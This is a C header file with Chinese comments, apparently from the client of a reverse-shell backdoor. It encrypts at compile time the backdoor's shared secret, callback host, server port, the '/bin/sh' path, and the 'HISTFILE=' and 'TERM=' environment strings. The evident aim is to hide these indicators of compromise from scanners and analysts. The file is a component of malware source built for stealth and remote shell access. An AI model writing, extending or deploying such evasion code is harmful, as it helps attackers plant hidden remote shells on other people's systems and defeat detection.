/**
 * client.obf.h - 客户端混淆配置层
 *
 * 从 client.h 读取原始配置，提供混淆版本
 * 混淆功能默认启用
 */

#ifndef CLIENT_OBF_H
#define CLIENT_OBF_H

#include "client.h"                           /* 引入原始配置（单一数据源） */
#include "../crypto/obfuscation/obfuscate.h"  /* 引入混淆功能 */

/* 混淆的敏感配置 - 从 client.h 读取值并在编译时加密 */
#define SECRET_OBF() OBFSTR(SECRET)
#define CB_HOST_OBF() OBFSTR(CB_HOST)
#define SERVER_PORT_OBF() OBF_PORT(SERVER_PORT)

/* 混淆的命令字符串 */
#define SHELL_PATH_OBF() OBFSTR("/bin/sh")
#define HISTFILE_OBF() OBFSTR("HISTFILE=")
#define TERM_OBF() OBFSTR("TERM=")

/* 混淆的错误消息 */
#define ERR_CANNOT_OPEN_FILE_OBF() OBFSTR("ERROR: Cannot open file")
#define UNKNOWN_HOST_OBF() OBFSTR("Unknown")

/* 混淆的系统信息格式 */
#define OS_INFO_FORMAT_OBF() OBFSTR("%s %s")

#endif /* CLIENT_OBF_H */
